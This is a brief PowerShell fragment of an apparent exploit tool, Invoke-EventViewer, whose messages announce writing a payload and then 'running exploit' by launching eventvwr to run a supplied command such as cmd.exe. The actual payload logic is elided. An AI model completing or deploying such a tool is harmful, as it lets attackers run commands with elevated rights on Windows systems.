function Invoke-EventViewer {
    if ($args){
        ...
        echo "[ 4/5 ] writing payload"
        WriteFile

        echo "[ 5/5 ] running exploit"
        eventvwr
    }
    else {
        echo '[ error ] invalid syntax'
        echo '[ syntax ] usage: Invoke-EventViewer cmd.exe'
    }
}
